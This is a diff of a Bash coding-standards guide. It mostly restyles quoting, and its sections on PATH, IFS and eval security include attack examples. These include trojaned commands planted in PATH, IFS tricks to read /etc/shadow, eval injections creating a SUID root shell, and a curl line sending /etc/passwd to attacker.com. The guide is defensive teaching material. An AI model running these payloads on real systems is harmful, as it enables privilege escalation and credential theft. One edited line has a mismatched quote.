-  [[ -e "$script" ]] || die 2 "File does not exist: $script"
-  [[ -f "$script" ]] || die 22 "Not a regular file: $script"
-  [[ -x "$script" ]] || die 126 "Not executable: $script"
-  [[ -s "$script" ]] || die 22 "File is empty: $script"
+  [[ -e "$script" ]] || die 2 "File does not exist ${script@Q}"
+  [[ -f "$script" ]] || die 22 "Not a regular file ${script@Q}"
+  [[ -x "$script" ]] || die 126 "Not executable ${script@Q}"
+  [[ -s "$script" ]] || die 22 "File is empty ${script@Q}"
 }
-\`\`\`
+```
+
 
 
 ---
@@ -17362,9 +17299,9 @@ validate_executable() {
 **Rule: BCS0902**
 
 ## Wildcard Expansion
-Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with \`-\`.
+Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with `-`.
 
-\`\`\`bash
+```bash
 # ✓ Correct - explicit path prevents flag interpretation
 rm -v ./*
 for file in ./*.txt; do
@@ -17373,7 +17310,8 @@ done
 
 # ✗ Incorrect - filenames starting with - become flags
 rm -v *
-\`\`\`
+```
+
 
 
 ---
@@ -17500,8 +17438,8 @@ echo "Count: $count"  # Correct value!
 ```bash
 # Read from multiple sources
 while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
-  echo "File1: $line1"
-  echo "File2: $line2"
+  echo "File1: ${line1@Q}"
+  echo "File2: ${line2@Q}"
 done 3< <(cat file1.txt) 4< <(cat file2.txt)
 
 # Merge sorted files
@@ -17528,7 +17466,7 @@ cat logfile.txt | tee \
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -17536,7 +17474,7 @@ declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
 # Compare configs on multiple servers
 compare_configs() {
   local -a servers=("$@")
-  local -- config_file='/etc/myapp/config.conf'
+  local -- config_file=/etc/myapp/config.conf
 
   if [[ ${#servers[@]} -lt 2 ]]; then
     error 'Need at least 2 servers to compare'
@@ -17587,18 +17525,18 @@ declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
 
 # Analyze log file in parallel
 analyze_log() {
-  local -- log_file="$1"
-  local -- output_dir="${2:-.}"
+  local -- log_file=$1
+  local -- output_dir=${2:-.}
 
-  info "Analyzing $log_file..."
+  info "Analyzing ${log_file@Q}..."
 
   # Process log file multiple ways simultaneously
   cat "$log_file" | tee \
-    >(grep 'ERROR' | sort -u > "$output_dir/errors.txt") \
-    >(grep 'WARN' | sort -u > "$output_dir/warnings.txt") \
-    >(awk '{print $1}' | sort -u > "$output_dir/unique_timestamps.txt") \
-    >(wc -l > "$output_dir/line_count.txt") \
-    > "$output_dir/full_log.txt"
+    >(grep 'ERROR' | sort -u > "$output_dir"/errors.txt) \
+    >(grep 'WARN' | sort -u > "$output_dir"/warnings.txt) \
+    >(awk '{print $1}' | sort -u > "$output_dir"/unique_timestamps.txt) \
+    >(wc -l > "$output_dir"/line_count.txt) \
+    > "$output_dir"/full_log.txt
 
   # Wait for all background processes
   wait
@@ -17606,9 +17544,9 @@ analyze_log() {
   # Report results
   local -i error_count warn_count total_lines
 
-  error_count=$(wc -l < "$output_dir/errors.txt")
-  warn_count=$(wc -l < "$output_dir/warnings.txt")
-  total_lines=$(cat "$output_dir/line_count.txt")
+  error_count=$(wc -l < "$output_dir"/errors.txt)
+  warn_count=$(wc -l < "$output_dir"/warnings.txt)
+  total_lines=$(cat "$output_dir"/line_count.txt)
 
   info "Analysis complete:"
   info "  Total lines: $total_lines"
@@ -17617,7 +17555,7 @@ analyze_log() {
 }
 
 main() {
-  local -- log_file="${1:-/var/log/app.log}"
+  local -- log_file=${1:-/var/log/app.log}
   analyze_log "$log_file"
 }
 
@@ -17633,15 +17571,15 @@ main "$@"
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
 
 # Merge and compare data from multiple sources
 merge_user_data() {
-  local -- source1="$1"
-  local -- source2="$2"
+  local -- source1=$1
+  local -- source2=$2
 
   # Read users from multiple sources simultaneously
   local -a users1 users2
@@ -17694,16 +17632,16 @@ rm "$temp1" "$temp2"
 diff <(sort file1) <(sort file2)
 
 # ✗ Wrong - pipe to while (subshell issue)
-count=0
+declare -i count=0
 cat file | while read -r line; do
-  ((count+=1))
+  count+=1
 done
 echo "$count"  # Still 0!
 
 # ✓ Correct - process substitution (no subshell)
-count=0
+declare -i count=0
 while read -r line; do
-  ((count+=1))
+  count+=1
 done < <(cat file)
 echo "$count"  # Correct value!
 
@@ -17831,9 +17769,9 @@ test_process_substitution() {
   test_file=$(echo <(echo "test"))
 
   if [[ -e "$test_file" ]]; then
-    info "Process substitution creates: $test_file"
+    info "Process substitution creates ${test_file@Q}"
   else
-    error "Process substitution not working"
+    error 'Process substitution not working'
     return 1
   fi
 
@@ -17841,10 +17779,10 @@ test_process_substitution() {
   local -- content
   content=$(cat <(echo "hello"))
 
-  if [[ "$content" == "hello" ]]; then
-    info "Process substitution read test: PASS"
+  if [[ "$content" == hello ]]; then
+    info 'Process substitution read test: PASS'
   else
-    error "Expected 'hello', got: $content"
+    error "Expected 'hello', got: ${content@Q}"
     return 1
   fi
 }
@@ -17916,10 +17854,11 @@ command <<< "$variable"
 
 **Rule: BCS0904**
 
-## Here Documents
+## 
+Here Documents
 Use for multi-line strings or input.
 
-\`\`\`bash
+```bash
 # No variable expansion (note single quotes)
 cat <<'EOF'
 This is a multi-line
@@ -17932,7 +17871,7 @@ cat <<EOF
 User: $USER
 Home: $HOME
 EOF
-\`\`\`
+```
 
 
 ---
@@ -18030,9 +17969,10 @@ for file in *.json; do
     process "$data"
 done
 
+declare -i errors=0
 for logfile in /var/log/app/*.log; do
     errors=$(grep -c ERROR < "$logfile")
-    if [ "$errors" -gt 0 ]; then
+    if ((errors)); then
         alert=$(< "$logfile")
         send_alert "$alert"
     fi
@@ -18044,9 +17984,10 @@ for file in *.json; do
     process "$data"
 done
 
+declare -i errors=0
 for logfile in /var/log/app/*.log; do
     errors=$(cat "$logfile" | grep -c ERROR)
-    if [ "$errors" -gt 0 ]; then
+    if ((errors)); then
         alert=$(cat "$logfile")
         send_alert "$alert"
     fi
@@ -18059,13 +18000,13 @@ done
 
 ```bash
 # RECOMMENDED
-if grep -q "ERROR" < /var/log/app.log; then
+if grep -q 'ERROR' < /var/log/app.log; then
     alert=$(< /var/log/app.log)
     notify "$alert"
 fi
 
 # AVOID
-if cat /var/log/app.log | grep -q "ERROR"; then
+if cat /var/log/app.log | grep -q 'ERROR'; then
     alert=$(cat /var/log/app.log)
     notify "$alert"
 fi
@@ -18157,6 +18098,7 @@ The benchmarks show:
 #!/bin/bash
 
 # Process all log files
+declare -i errors=0
 for logfile in /var/log/app/*.log; do
     # Read entire file
     content=$(cat "$logfile")
@@ -18168,7 +18110,7 @@ for logfile in /var/log/app/*.log; do
     warnings=$(cat "$logfile" | grep WARNING)
 
     # Process if errors found
-    if [ "$errors" -gt 0 ]; then
+    if ((errors)); then
         cat "$logfile" error.log > combined.log
     fi
 done
@@ -18185,6 +18127,7 @@ done
 #!/bin/bash
 
 # Process all log files
+declare -i errors=0
 for logfile in /var/log/app/*.log; do
     # Read entire file - 100x faster
     content=$(< "$logfile")
@@ -18196,7 +18139,7 @@ for logfile in /var/log/app/*.log; do
     warnings=$(grep WARNING < "$logfile")
 
     # Process if errors found
-    if [ "$errors" -gt 0 ]; then
+    if ((errors)); then
         # Multiple files - must use cat
         cat "$logfile" error.log > combined.log
     fi
@@ -18344,7 +18287,7 @@ This multi-step process creates numerous attack vectors that don't exist for com
 set -euo pipefail
 
 # Intended: Check if service is running
-service_name="$1"
+service_name=$1
 status=$(systemctl status "$service_name")
 echo "$status"
 ```
@@ -18438,7 +18381,7 @@ LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh
 #!/bin/bash
 # /usr/local/bin/cleaner.sh (SUID root)
 
-directory="$1"
+directory=$1
 # Intended to clean old files
 find "$directory" -type f -mtime +30 -delete
 ```
@@ -18461,11 +18404,11 @@ find "$directory" -type f -mtime +30 -delete
 # /usr/local/bin/secure_write.sh (SUID root)
 set -euo pipefail
 
-output_file="$1"
+output_file=$1
 
 # Check if file is safe to write
 if [[ -f "$output_file" ]]; then
-  die 1 'File already exists'
+  die 1 "File ${output_file@Q} already exists'
 fi
 
 # Race condition window here!
@@ -18650,7 +18593,7 @@ Modern Linux distributions (since ~2005) ignore SUID bits on scripts by default,
 
 **Lock down PATH at script start:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18660,11 +18603,11 @@ export PATH
 
 # Rest of script uses locked-down PATH
 command=$(which ls)  # Searches only trusted directories
-\`\`\`
+```
 
 **Alternative: Validate existing PATH:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18677,11 +18620,11 @@ set -euo pipefail
 # Additional checks for suspicious paths
 [[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
 [[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
-\`\`\`
+```
 
 **Attack Example 1: Current Directory in PATH**
 
-\`\`\`bash
+```bash
 # Vulnerable script (doesn't set PATH)
 #!/bin/bash
 # /usr/local/bin/backup.sh
@@ -18689,10 +18632,10 @@ set -euo pipefail
 
 # Script intends to use system ls
 ls -la /etc > /tmp/backup_list.txt
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker creates malicious 'ls' in /tmp
 cat > /tmp/ls << 'EOF'
 #!/bin/bash
@@ -18713,20 +18656,20 @@ cd /tmp
 
 # Script executes /tmp/ls instead of /bin/ls
 # Attacker's code runs with script's privileges
-\`\`\`
+```
 
 **Attack Example 2: Empty PATH Element**
 
-\`\`\`bash
+```bash
 # PATH with empty element (double colon)
 PATH=/usr/local/bin::/usr/bin:/bin
 
 # Empty element is interpreted as current directory
 # Same risk as PATH=.:/usr/local/bin:/usr/bin:/bin
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker creates malicious command in accessible directory
 cat > ~/tar << 'EOF'
 #!/bin/bash
@@ -18741,17 +18684,17 @@ chmod +x ~/tar
 cd ~
 # With :: in PATH, searches current directory (~/tar found!)
 tar -czf backup.tar.gz data/
-\`\`\`
+```
 
 **Attack Example 3: Writable Directory in PATH**
 
-\`\`\`bash
+```bash
 # PATH includes /opt/local/bin which is world-writable (misconfigured)
 PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker creates trojan in writable PATH directory
 cat > /opt/local/bin/ps << 'EOF'
 #!/bin/bash
@@ -18764,13 +18707,13 @@ EOF
 chmod +x /opt/local/bin/ps
 
 # When ANY script runs 'ps', attacker gains root access
-\`\`\`
+```
 
 **Secure PATH patterns:**
 
 **Pattern 1: Complete lockdown (recommended for security-critical scripts):**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
@@ -18782,11 +18725,11 @@ export PATH
 # Use commands with confidence
 tar -czf /backup/data.tar.gz /var/data
 systemctl restart nginx
-\`\`\`
+```
 
 **Pattern 2: Full command paths (maximum security):**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18798,11 +18741,11 @@ set -euo pipefail
 # Especially critical for common commands that might be trojaned
 /bin/rm -rf /tmp/workdir
 /bin/cat /etc/passwd | /bin/grep root
-\`\`\`
+```
 
 **Pattern 3: PATH validation with fallback:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18823,11 +18766,11 @@ validate_path() {
 validate_path
 
 # Rest of script
-\`\`\`
+```
 
 **Pattern 4: Command verification:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18851,11 +18794,11 @@ verify_command systemctl /usr/bin/systemctl
 
 # Now safe to use
 tar -czf backup.tar.gz data/
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - trusting inherited PATH
 #!/bin/bash
 set -euo pipefail
@@ -18894,11 +18837,11 @@ set -euo pipefail
 readonly PATH='/usr/local/bin:/usr/bin:/bin'
 export PATH
 # Now all commands use secure PATH
-\`\`\`
+```
 
 **Edge case: Scripts that need custom paths:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
@@ -18913,16 +18856,16 @@ export PATH="$BASE_PATH:$APP_PATH"
 readonly PATH
 
 # Validate application path exists and is not world-writable
-[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist: $APP_PATH"
-[[ -w "$APP_PATH" ]] && die 1 "Application path is writable: $APP_PATH"
+[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist ${APP_PATH@Q}"
+[[ -w "$APP_PATH" ]] && die 1 "Application path is writable ${APP_PATH@Q}"
 
 # Use commands from combined PATH
 myapp-command --option
-\`\`\`
+```
 
 **Special consideration: Sudo and PATH:**
 
-\`\`\`bash
+```bash
 # When using sudo, PATH is reset by default
 # /etc/sudoers typically includes:
 # Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
@@ -18937,11 +18880,11 @@ sudo /usr/local/bin/backup.sh
 sudo /usr/local/bin/backup.sh
 # Even if sudo preserves PATH, script overwrites it:
 #   readonly PATH='/usr/local/bin:/usr/bin:/bin'
-\`\`\`
+```
 
 **Checking PATH from within script:**
 
-\`\`\`bash
+```bash
 # Debug: Show PATH being used
 debug() {
   >&2 echo "DEBUG: Current PATH=$PATH"
@@ -18975,11 +18918,11 @@ check_path_security() {
 }
 
 check_path_security || die 1 'PATH security validation failed'
-\`\`\`
+```
 
 **System-wide PATH security:**
 
-\`\`\`bash
+```bash
 # Check system default PATH in /etc/environment
 cat /etc/environment
 # Should be: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
@@ -18988,17 +18931,17 @@ cat /etc/environment
 IFS=':' read -ra path_dirs <<< "$PATH"
 for dir in "${path_dirs[@]}"; do
   if [[ -d "$dir" && -w "$dir" ]]; then
-    warn "World-writable directory in PATH: $dir"
+    warn "World-writable directory in PATH ${dir@Q}"
   fi
 done
 
 # Find world-writable directories in PATH
 find $(echo "$PATH" | tr ':' ' ') -maxdepth 0 -type d -writable 2>/dev/null
-\`\`\`
+```
 
 **Real-world example: Distribution installer script:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 # Secure installer script for system-wide deployment
 set -euo pipefail
@@ -19008,7 +18951,7 @@ shopt -s inherit_errexit shift_verbose extglob nullglob
 readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
 export PATH
 
-VERSION='1.0.0'
+VERSION=1.0.0
 SCRIPT_NAME=$(basename "$0")
 
 # Script metadata
@@ -19021,7 +18964,7 @@ command -v tar | grep -q '^/bin/tar$' || \
   die 1 'Security: tar command not from /bin/tar'
 
 # Rest of secure installation logic
-\`\`\`
+```
 
 **Summary:**
 
@@ -19059,7 +19002,7 @@ command -v tar | grep -q '^/bin/tar$' || \
 
 IFS (Internal Field Separator) controls how Bash splits words during expansion. Default is `$' \t\n'` (space, tab, newline).
 
-\`\`\`bash
+```bash
 # Default IFS behavior
 IFS=$' \t\n'  # Space, tab, newline (default)
 data="one two three"
@@ -19071,18 +19014,18 @@ IFS=','
 data="apple,banana,orange"
 read -ra fruits <<< "$data"
 # Result: fruits=("apple" "banana" "orange")
-\`\`\`
+```
 
 **Attack Example 1: Field Splitting Exploitation**
 
-\`\`\`bash
+```bash
 # Vulnerable script - doesn't protect IFS
 #!/bin/bash
 set -euo pipefail
 
 # Script expects space-separated list
 process_files() {
-  local -- file_list="$1"
+  local -- file_list=$1
   local -a files
 
   # Vulnerable: IFS could be manipulated
@@ -19096,10 +19039,10 @@ process_files() {
 # Normal usage
 process_files "temp1.txt temp2.txt temp3.txt"
 # Deletes: temp1.txt, temp2.txt, temp3.txt
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker sets IFS to slash
 export IFS='/'
 ./vulnerable-script.sh
@@ -19113,26 +19056,26 @@ export IFS=$'\n'
 ./vulnerable-script.sh "/etc/passwd
 /root/.ssh/authorized_keys"
 # Now the script processes these filenames as if they were in the list
-\`\`\`
+```
 
 **Attack Example 2: Command Injection via IFS**
 
-\`\`\`bash
+```bash
 # Vulnerable script
 #!/bin/bash
 set -euo pipefail
 
 # Process user-provided command with arguments
-user_input="$1"
+user_input=$1
 # Split on spaces to get command and arguments
 read -ra cmd_parts <<< "$user_input"
 
 # Execute command
 "${cmd_parts[@]}"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker manipulates IFS before calling script
 export IFS='X'
 ./vulnerable-script.sh "lsX-laX/etc/shadow"
@@ -19141,34 +19084,34 @@ export IFS='X'
 # cmd_parts=("ls" "-la" "/etc/shadow")
 # Script executes: ls -la /etc/shadow
 # Attacker bypassed any input validation that checked for spaces!
-\`\`\`
+```
 
 **Attack Example 3: Privilege Escalation via SUID Script**
 
-\`\`\`bash
+```bash
 # Vulnerable SUID script (should never exist, but illustrative)
 #!/bin/bash
 # /usr/local/bin/backup.sh (SUID root - NEVER DO THIS!)
 
 # Supposed to back up only allowed directories
-allowed_dirs="home var opt"
+allowed_dirs='home var opt'
 
 # Check if user-provided directory is allowed
-user_dir="$1"
+user_dir=$1
 is_allowed=0
 
 for dir in $allowed_dirs; do  # Unquoted expansion uses IFS!
-  [[ "$user_dir" == "$dir" ]] && is_allowed=1
+  [[ "$user_dir" == "$dir" ]] && is_allowed=1 ||:
 done
 
 ((is_allowed)) || die 5 "Directory not allowed: $user_dir"
 
 # Back up the directory with root privileges
 tar -czf "/backup/${user_dir}.tar.gz" "/$user_dir"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker sets IFS to 'e'
 export IFS='e'
 /usr/local/bin/backup.sh "etc"
@@ -19181,14 +19124,14 @@ export IFS='e'
 export IFS=' e'
 # Now "home" splits to "hom " "
 # The attacker can craft IFS to make "etc" appear in the allowed list
-\`\`\`
+```
 
 **Safe Pattern 1: Save and Restore IFS (Explicit)**
 
-\`\`\`bash
+```bash
 # ✓ Correct - save, modify, restore
 parse_csv() {
-  local -- csv_data="$1"
+  local -- csv_data=$1
   local -a fields
   local -- saved_ifs
 
@@ -19207,14 +19150,14 @@ parse_csv() {
     info "Field: $field"
   done
 }
-\`\`\`
+```
 
 **Safe Pattern 2: Subshell Isolation (Preferred)**
 
-\`\`\`bash
+```bash
 # ✓ Correct - IFS change isolated to subshell
 parse_csv() {
-  local -- csv_data="$1"
+  local -- csv_data=$1
   local -a fields
 
   # Use subshell - IFS change automatically reverts when subshell exits
@@ -19232,14 +19175,14 @@ parse_csv() {
     info "Field: $field"
   done
 }
-\`\`\`
+```
 
 **Safe Pattern 3: Local IFS in Function**
 
-\`\`\`bash
+```bash
 # ✓ Correct - use local to scope IFS change
 parse_csv() {
-  local -- csv_data="$1"
+  local -- csv_data=$1
   local -a fields
   local -- IFS  # Make IFS local to this function
 
@@ -19254,11 +19197,11 @@ parse_csv() {
 }
 
 # After function returns, IFS is unchanged in caller
-\`\`\`
+```
 
 **Safe Pattern 4: One-Line IFS Assignment**
 
-\`\`\`bash
+```bash
 # ✓ Correct - IFS change applies only to single command
 # This is a bash feature: VAR=value command applies VAR only to that command
 
@@ -19271,11 +19214,11 @@ IFS=':' read -ra path_dirs <<< "$PATH"
 # IFS is automatically reset after the read command
 
 # This is the most concise and safe pattern for single operations
-\`\`\`
+```
 
 **Safe Pattern 5: Explicitly Set IFS at Script Start**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
@@ -19288,11 +19231,11 @@ export IFS
 
 # Rest of script operates with trusted IFS
 # Any attempt to modify IFS will fail due to readonly
-\`\`\`
+```
 
 **Edge case: IFS with read -d (delimiter)**
 
-\`\`\`bash
+```bash
 # When using read -d, IFS still matters for field splitting
 # The delimiter (-d) determines where to stop reading
 # IFS determines how to split what was read
@@ -19305,11 +19248,11 @@ while IFS= read -r -d '' file; do
 done < <(find . -type f -print0)
 
 # This is the safe pattern for filenames with spaces
-\`\`\`
+```
 
 **Edge case: IFS and globbing**
 
-\`\`\`bash
+```bash
 # IFS affects word splitting, NOT pathname expansion (globbing)
 IFS=':'
 files=*.txt  # Glob expands normally
@@ -19319,11 +19262,11 @@ echo $files  # Splits on ':' - WRONG!
 
 # Always quote to prevent IFS-based splitting
 echo "$files"  # Safe - no splitting
-\`\`\`
+```
 
 **Edge case: Empty IFS**
 
-\`\`\`bash
+```bash
 # Setting IFS='' (empty) disables field splitting entirely
 IFS=''
 data="one two three"
@@ -19332,11 +19275,11 @@ read -ra words <<< "$data"
 
 # This can be useful to preserve exact input
 IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - modifying IFS without save/restore
 IFS=','
 read -ra fields <<< "$csv_data"
@@ -19392,11 +19335,11 @@ IFS=':' read -r user pass uid gid name home shell <<< "$passwd_line"
 # ✓ Correct - use cut or awk for structured data
 user=$(cut -d: -f1 <<< "$passwd_line")
 uid=$(cut -d: -f3 <<< "$passwd_line")
-\`\`\`
+```
 
 **Complete safe example:**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
@@ -19406,20 +19349,20 @@ IFS=$' \t\n'
 readonly IFS
 export IFS
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
 
 # Parse CSV data safely
 parse_csv_file() {
-  local -- csv_file="$1"
+  local -- csv_file=$1
   local -a records
 
   # Read file line by line
+  local -a fields
   while IFS= read -r line; do
     # Parse CSV fields using subshell-isolated IFS
-    local -a fields
     (
       IFS=','
       read -ra fields <<< "$line"
@@ -19434,7 +19377,7 @@ parse_csv_file() {
 
 # Alternative: One-line IFS for each read
 parse_csv_line() {
-  local -- csv_line="$1"
+  local -- csv_line=$1
   local -a fields
 
   # IFS applies only to this read command
@@ -19453,11 +19396,11 @@ main() {
 main "$@"
 
 #fin
-\`\`\`
+```
 
 **Testing IFS safety:**
 
-\`\`\`bash
+```bash
 # Test script behavior with malicious IFS
 test_ifs_safety() {
   # Save original IFS
@@ -19477,11 +19420,11 @@ test_ifs_safety() {
     return 1
   fi
 }
-\`\`\`
+```
 
 **Checking current IFS:**
 
-\`\`\`bash
+```bash
 # Display current IFS (non-printable characters shown)
 debug() {
   local -- ifs_visual
@@ -19501,7 +19444,7 @@ verify_default_ifs() {
     debug
   fi
 }
-\`\`\`
+```
 
 **Summary:**
 
@@ -19538,7 +19481,7 @@ verify_default_ifs() {
 
 `eval` takes a string, performs all expansions on it, then executes the result as a command.
 
-\`\`\`bash
+```bash
 # Basic eval behavior
 cmd='echo "Hello World"'
 eval "$cmd"  # Executes: echo "Hello World"
@@ -19549,24 +19492,24 @@ var='$(whoami)'
 eval "echo $var"  # First expansion: echo $(whoami)
                    # Second expansion: executes whoami command!
 # Output: username
-\`\`\`
+```
 
 **Attack Example 1: Direct Command Injection**
 
-\`\`\`bash
+```bash
 # Vulnerable script - NEVER DO THIS!
 #!/bin/bash
 set -euo pipefail
 
 # Script allows user to set a variable
-user_input="$1"
+user_input=$1
 
 # Dangerous: eval executes arbitrary code
 eval "$user_input"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker provides malicious input
 ./vulnerable-script.sh 'rm -rf /tmp/*'
 # Executes: rm -rf /tmp/*
@@ -19579,27 +19522,27 @@ eval "$user_input"
 
 # Or create SUID shell
 ./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
-\`\`\`
+```
 
 **Attack Example 2: Variable Name Injection**
 
-\`\`\`bash
+```bash
 # Vulnerable script - seems safe but isn't!
 #!/bin/bash
 set -euo pipefail
 
 # User provides variable name and value
-var_name="$1"
-var_value="$2"
+var_name=$1
+var_value=$2
 
 # Attempt to set variable dynamically - DANGEROUS!
 eval "$var_name='$var_value'"
 
 echo "Variable $var_name has been set"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker injects command via variable name
 ./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'
 
@@ -19612,17 +19555,17 @@ echo "Variable $var_name has been set"
 # The eval executes:
 # x='$(cat /etc/shadow > /tmp/stolen)'
 # Command substitution runs with script privileges!
-\`\`\`
+```
 
 **Attack Example 3: Escaped Character Bypass**
 
-\`\`\`bash
+```bash
 # Vulnerable script - attempts sanitization
 #!/bin/bash
 set -euo pipefail
 
 # User input for calculation
-user_expr="$1"
+user_expr=$1
 
 # Attempt to sanitize - INSUFFICIENT!
 sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators
@@ -19630,24 +19573,24 @@ sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators
 # Still dangerous!
 eval "result=$sanitized"
 echo "Result: $result"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker uses allowed characters maliciously
 ./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'
 
 # Or uses integer assignment to overwrite critical variables
 ./vulnerable-script.sh 'PATH=0'
 # Now PATH is set to 0, breaking the script or enabling other attacks
-\`\`\`
+```
 
 **Attack Example 4: Log Injection via eval**
 
-\`\`\`bash
+```bash
 # Vulnerable logging function
 log_event() {
-  local -- event="$1"
+  local -- event=$1
   local -- timestamp
   timestamp=$(date '+%Y-%m-%d %H:%M:%S')
 
@@ -19657,23 +19600,23 @@ log_event() {
 }
 
 # Usage
-user_action="$1"
+user_action=$1
 log_event "$user_action"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker injects command via event parameter
 ./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
 
 # The eval executes:
 # echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
 # Three commands execute: echo, cat (malicious), echo
-\`\`\`
+```
 
 **Safe Alternative 1: Use Arrays for Command Construction**
 
-\`\`\`bash
+```bash
 # ✓ Correct - build command safely with array
 build_find_command() {
   local -- search_path="$1"
@@ -19691,11 +19634,11 @@ build_find_command() {
 build_find_command '/var/data' '*.txt'
 
 # Array preserves exact arguments, no injection possible
-\`\`\`
+```
 
 **Safe Alternative 2: Use Indirect Expansion for Variable References**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - using eval for variable indirection
 var_name='HOME'
 eval "value=\\$$var_name"  # Gets value of $HOME
@@ -19710,11 +19653,11 @@ var_name='MY_VAR'
 value='Hello World'
 printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
 echo "${!var_name}"  # Access value
-\`\`\`
+```
 
 **Safe Alternative 3: Use Associative Arrays for Dynamic Data**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - using eval to create dynamic variables
 for i in {1..5}; do
   eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
@@ -19728,13 +19671,13 @@ done
 
 # Access values
 echo "${data[var_3]}"  # value 3
-\`\`\`
+```
 
 **Safe Alternative 4: Use Functions Instead of Dynamic Code**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval to select function dynamically
-action="$1"
+action=$1
 eval "${action}_function"  # If action='malicious', dangerous!
 
 # ✓ Correct - use case statement
@@ -19743,7 +19686,7 @@ case "$action" in
   stop)    stop_function ;;
   restart) restart_function ;;
   status)  status_function ;;
-  *)       die 22 "Invalid action: $action" ;;
+  *)       die 22 "Invalid action ${action@Q}" ;;
 esac
 
 # ✓ Also correct - use array of function names
@@ -19757,13 +19700,13 @@ declare -A actions=(
 if [[ -v "actions[$action]" ]]; then
   "${actions[$action]}"
 else
-  die 22 "Invalid action: $action"
+  die 22 "Invalid action ${action@Q}"
 fi
-\`\`\`
+```
 
 **Safe Alternative 5: Use Command Substitution for Output Capture**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for command output
 cmd='ls -la /tmp'
 eval "output=\$($cmd)"  # Dangerous!
@@ -19774,11 +19717,11 @@ output=$(ls -la /tmp)
 # ✓ Correct - if command is in variable, use array
 declare -a cmd=(ls -la /tmp)
 output=$("${cmd[@]}")
-\`\`\`
+```
 
 **Safe Alternative 6: Use read for Parsing**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for parsing key=value pairs
 config_line="PORT=8080"
 eval "$config_line"  # Sets PORT variable - DANGEROUS!
@@ -19793,11 +19736,11 @@ if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
 else
   die 22 "Invalid configuration key: $key"
 fi
